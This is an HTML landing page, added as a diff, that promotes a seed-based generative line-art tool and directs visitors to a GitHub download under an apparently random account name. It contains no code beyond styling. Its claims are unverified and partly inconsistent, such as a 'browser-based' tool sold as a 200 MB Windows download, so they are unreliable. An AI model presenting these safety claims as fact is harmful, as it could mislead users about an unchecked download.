@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Framed-Line-Generative-Art - Create Curvy Line Art From Seeds</title>
+<meta name="description" content="Framed-Line-Generative-Art is a seed-based generative art application that connects scattered points with curvy Bezier lines, gradient hues and variable weights. Download it for Windows and create reproducible line studies in your browser.">
+<meta name="keywords" content="generative art, seeded random, bezier lines, computational design, p5js, textile design, surface design, html, javascript, css, line art, reproducible art">
+<meta name="author" content="Framed-Line-Generative-Art">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/bronchoscopic-hanoverian4788/Framed-Line-Generative-Art">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Framed-Line-Generative-Art - Create Curvy Line Art From Seeds">
+<meta property="og:description" content="Seed-based generative gesture: scattered points connected by curvy Bezier lines with gradient hue and weight. Reproducible line studies for design, surface and textile work.">
+<meta property="og:url" content="https://github.com/bronchoscopic-hanoverian4788/Framed-Line-Generative-Art">
+<meta property="og:site_name" content="Framed-Line-Generative-Art">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Framed-Line-Generative-Art - Create Curvy Line Art From Seeds">
+<meta name="twitter:description" content="Generate repeatable curvy line art from a seed number. Gradient hues, variable line weight, endless variations. Free download for Windows.">
+<style>
+  :root {
+    --ink: #1b1a24;
+    --muted: #5a5769;
+    --line: #e6e2ee;
+    --paper: #faf9fc;
+    --card: #ffffff;
+    --accent: #6d3bd6;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background:
+      radial-gradient(1200px 600px at 12% -10%, #efe6ff 0%, rgba(239,230,255,0) 60%),
+      radial-gradient(900px 500px at 100% 0%, #ffe8f1 0%, rgba(255,232,241,0) 55%),
+      var(--paper);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 56px 22px 80px;
+  }
+  h1 {
+    font-size: 2.35rem;
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.3;
+    letter-spacing: -0.01em;
+    margin: 52px 0 14px;
+    font-weight: 750;
+    padding-bottom: 8px;
+    border-bottom: 2px solid var(--line);
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: var(--ink); }
+  .lede {
+    font-size: 1.12rem;
+    color: var(--muted);
+    margin-bottom: 28px;
+  }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    color: #ffffff;
+    background: linear-gradient(135deg, #6d3bd6 0%, #c02c8c 55%, #ff7a4d 100%);
+    padding: 17px 34px;
+    border-radius: 14px;
+    font-weight: 750;
+    font-size: 1.06rem;
+    letter-spacing: 0.01em;
+    box-shadow: 0 10px 24px rgba(109, 59, 214, 0.28), 0 2px 6px rgba(0, 0, 0, 0.08);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 16px 32px rgba(109, 59, 214, 0.34), 0 3px 8px rgba(0, 0, 0, 0.1);
+  }
+  .btn-small {
+    padding: 13px 26px;
+    font-size: 0.98rem;
+  }
+  .badge-row {
+    margin: 30px 0 10px;
+  }
+  .note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.94rem;
+    color: var(--muted);
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 22px 24px;
+    margin: 22px 0;
+    box-shadow: 0 6px 18px rgba(27, 26, 36, 0.05);
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 16px;
+    margin: 22px 0;
+  }
+  .grid .card { margin: 0; }
+  ul, ol { margin: 0 0 18px; padding-left: 22px; }
+  li { margin-bottom: 9px; }
+  code {
+    background: #f1ecfb;
+    color: #4c1fb0;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-size: 0.92em;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  .steps li { margin-bottom: 14px; }
+  .divider {
+    height: 1px;
+    background: var(--line);
+    margin: 44px 0;
+    border: 0;
+  }
+  .faq-q {
+    font-weight: 700;
+    margin: 22px 0 4px;
+    color: var(--ink);
+  }
+  .faq-a { margin: 0 0 6px; color: var(--muted); }
+  a.inline { color: var(--accent); font-weight: 650; text-decoration: none; }
+  a.inline:hover { text-decoration: underline; }
+  .pill {
+    display: inline-block;
+    font-size: 0.78rem;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    font-weight: 700;
+    color: #6d3bd6;
+    background: #efe8ff;
+    border-radius: 999px;
+    padding: 5px 13px;
+    margin-bottom: 14px;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .wrap { padding: 36px 18px 64px; }
+    h1 { font-size: 1.78rem; }
+    h2 { font-size: 1.24rem; margin-top: 40px; }
+    .btn { display: block; text-align: center; padding: 16px 20px; }
+  }
+</style>
+</head>
+<body>
+<main class="wrap">
+
+  <h1>🎨 Framed-Line-Generative-Art - Curvy Line Art From a Single Seed</h1>
+
+  <p class="lede">A small, friendly art application that turns a simple number into flowing, framed line studies. Scattered points get joined by smooth curvy lines, painted with shifting hues and changing line weights. Type the same number again and you get the exact same picture — every time.</p>
+
+  <div class="badge-row">
+    <a class="btn" href="https://github.com/bronchoscopic-hanoverian4788/Framed-Line-Generative-Art" target="_blank" rel="noopener">⬇️ Get Framed-Line-Generative-Art</a>
+    <span class="note">Takes you to the project download page on GitHub.</span>
+  </div>
+
+  <h2>🌱 What This Application Does</h2>
+
+  <p>Imagine tipping a handful of dots onto a sheet of paper. Now imagine stretching a thin, bendy ribbon between those dots so that each one connects to the next in a soft, sweeping curve. That is the heart of this application.</p>
+
+  <p>Instead of drawing with a pencil, you draw with a <em>seed</em> — a plain number you type in. The application reads that number and uses it to decide where the dots land, how tightly the curves bend, what colours the lines take on, and how thick each stroke becomes. Change the number, and a completely different picture appears. Type the old number back in, and the original picture comes back, unchanged.</p>
+
+  <p>The result looks a bit like spun thread, a bit like a contour map, and a bit like a hand-drawn illustration from a design sketchbook. Everything happens instantly inside your web browser, and nothing is uploaded anywhere — the artwork is created on your own machine.</p>
+
+  <div class="grid">
+    <div class="card">
+      <h3>🎯 Repeatable by design</h3>
+      <p style="margin:0; color:#5a5769; font-size:0.96rem;">The same seed always produces the same artwork. Share a number with a colleague and they will see exactly what you see.</p>
+    </div>
+    <div class="card">
+      <h3>🌈 Gradient colour</h3>
+      <p style="margin:0; color:#5a5769; font-size:0.96rem;">Lines glide through a smooth range of hues, so each strand shifts in colour as it travels across the frame.</p>
+    </div>
+    <div class="card">
+      <h3>✏️ Variable line weight</h3>
+      <p style="margin:0; color:#5a5769; font-size:0.96rem;">Some strokes arrive thin and delicate, others thick and bold, building depth and a sense of movement.</p>
+    </div>
+    <div class="card">
+      <h3>🖼️ Framed output</h3>
+      <p style="margin:0; color:#5a5769; font-size:0.96rem;">Every study is presented inside a clean frame, ready to be captured as a reference image for your own projects.</p>
+    </div>
+  </div>
+
+  <h2>🖥️ System Requirements</h2>
+
+  <p>This is a lightweight browser-based application, so it does not need a powerful computer. The following is a comfortable baseline for Windows:</p>
+
+  <ul>
+    <li>Windows 10 or Windows 11 (64-bit recommended).</li>
+    <li>A modern web browser — Microsoft Edge, Google Chrome, Mozilla Firefox, or Brave, kept up to date.</li>
+    <li>Around 200 MB of free disk space for the downloaded folder and your saved artwork.</li>
+    <li>4 GB of memory or more. 8 GB is ideal if you like keeping many browser tabs open.</li>
+    <li>A screen resolution of 1280 × 720 or better, so the framed canvas is fully visible.</li>
+    <li>No internet connection is needed after the initial download — the artwork is generated entirely on your own computer.</li>
+    <li>No account, licence key, or sign-up is required.</li>
+  </ul>
+
+  <h2>🚀 Getting Started</h2>
+
+  <p>Setup is short and needs no technical knowledge. There is only one download step.</p>
+
+  <div class="card">
+    <span class="pill">Step 1 of 4</span>
+    <h3 style="margin-top:0;">Open the download page</h3>
+    <p style="margin-bottom:18px;">Visit this link to download the application. The page you land on contains the project files and the download button for the latest version.</p>
+    <a class="btn btn-small" href="https://github.com/bronchoscopic-hanoverian4788/Framed-Line-Generative-Art" target="_blank" rel="noopener">⬇️ Visit the Download Page</a>
+  </div>
+
+  <ol class="steps">
+    <li><strong>Save the project folder to your computer.</strong> Choose somewhere easy to find, such as your Desktop or your Downloads folder. Keeping the folder in one tidy place makes it simple to open again later.</li>
+    <li><strong>Open the folder.</strong> Use File Explorer to navigate to the location where you saved it. Inside you will find the application files, including an <code>index.html</code> page — that is the page that starts the application.</li>
+    <li><strong>Double-click <code>index.html</code>.</strong> Your default web browser will open and the application will load. If it opens in the wrong browser, right-click the file, choose <em>Open with</em>, and pick Edge, Chrome, or Firefox instead.</li>
+    <li><strong>Start creating.</strong> A line study appears straight away. Type a seed number into the seed box, press the generate button, and watch a brand new composition draw itself across the frame.</li>
+  </ol>
+
+  <p>That is the whole setup. There is no installer wizard, no administrator password, and nothing is added to your Start menu. The application runs straight from the folder you saved.</p>
+
+  <h2>🖱️ How to Use the Application</h2>
+
+  <p>The interface is deliberately minimal so you can focus on the artwork rather than the controls.</p>
+
+  <ul>
+    <li><strong>Seed field.</strong> A number that determines the entire composition: point placement, curve shape, colour range, and line weight. Type any whole number you like.</li>
+    <li><strong>Generate button.</strong> Draws the study for the seed currently in the field. If you leave the field blank, the application picks a seed for you and shows it so you can note it down.</li>
+    <li><strong>Frame area.</strong> The main canvas in the centre of the page. This is where the artwork appears, inside its frame.</li>
+    <li><strong>Save option.</strong> Captures the current study as an image file so you can keep it, print it, or drop it into a design document.</li>
+  </ul>
+
+  <p>A productive way to work is to generate a seed, save it if you like the result, then nudge the number by one and generate again. Neighbouring seeds often produce related compositions, which makes it easy to explore a family of similar studies before settling on a favourite.</p>
+
+  <h2>🔁 Why "Reproducible" Matters</h2>
+
+  <p>Many generative tools give you a beautiful result you can never quite get back. This one is built around the opposite idea: every picture is tied to a number, and that number is all you need to recreate it.</p>
+
+  <p>That has real, practical benefits:</p>
+
+  <ul>
+    <li>A seed written in a notebook is a permanent recipe for one exact artwork.</li>
+    <li>Two people on opposite sides of the world can compare the same study by swapping a number.</li>
+    <li>You can return to a design weeks later and continue from exactly where you stopped.</li>
+    <li>Colourways and compositions can be catalogued alongside the seed that produced them.</li>
+  </ul>
+
+  <h2>🧵 Built for Design Work</h2>
+
+  <p>The line studies this application produces were made with surface and textile design in mind. Sweeping curved lines with soft colour gradients translate naturally into embroidery paths, printed fabric repeats, woven patterns, screen-print layers, and wall art.</p>
+
+  <p>Because each study is reproducible, a seed becomes a design reference. You can log a set of seeds as a small collection, revisit them when a client asks for variations, and keep the whole family visually consistent while still offering genuine difference.</p>
+
+  <h2>🛠️ Troubleshooting</h2>
+
+  <p>Almost every hiccup with a browser-based application is quick to fix. Try these in order.</p>
+
+  <ul>
+    <li><strong>Nothing happens on double-click.</strong> Right-click the <code>index.html</code> file and choose <em>Open with</em>, then select a modern browser such as Edge or Chrome.</li>
+    <li><strong>The page looks blank or unstyled.</strong> Refresh the page with <code>Ctrl</code> + <code>F5</code> to force a clean reload, clearing any stale copy from the browser cache.</li>
+    <li><strong>The canvas appears empty.</strong> Make sure you have typed a seed and pressed the generate button. A blank seed field may simply be waiting for input.</li>
+    <li><strong>Lines look jagged or cut off.</strong> Maximise the browser window so the frame has enough room, and check that your browser zoom is set to 100 per cent.</li>
+    <li><strong>The download did not complete.</strong> Revisit the download page and save the project folder again, ideally to a folder outside any cloud-synced directory.</li>
+    <li><strong>Something still will not work.</strong> Update your browser to the newest version, then try again. Out-of-date browsers are the single most common cause of display problems.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <p class="faq-q">Do I need to install anything?</p>
+  <p class="faq-a">No installation is required. The application runs directly in your web browser from the folder you download.</p>
+
+  <p class="faq-q">Do I need to know how to code?</p>
+  <p class="faq-a">Not at all. You type a number, press a button, and look at the artwork. That is the entire workflow for everyday use.</p>
+
+  <p class="faq-q">Is my artwork sent anywhere?</p>
+  <p class="faq-a">No. Everything is generated locally on your own computer. Nothing leaves your machine.</p>
+
+  <p class="faq-q">Can I use the artwork commercially?</p>
+  <p class="faq-a">The studies you generate are yours to use in your own design work. Check the licence file included with the project for the exact terms covering the code itself.</p>
+
+  <p class="faq-q">Can I share a seed with someone else?</p>
+  <p class="faq-a">Yes, and that is one of the best features. Send the number, they type it in, and they see precisely the same composition you do.</p>
+
+  <p class="faq-q">Does it work on a Mac or a tablet?</p>
+  <p class="faq-a">The instructions here focus on Windows, but the application is browser-based, so it generally runs on any modern device with a current browser.</p>
+
+  <p class="faq-q">What if I lose the folder?</p>
+  <p class="faq-a">Simply download it again from the link above. Keep a note of the seed numbers you liked most, and you can rebuild every one of your favourite studies.</p>
+
+</main>
+</body>
+</html>
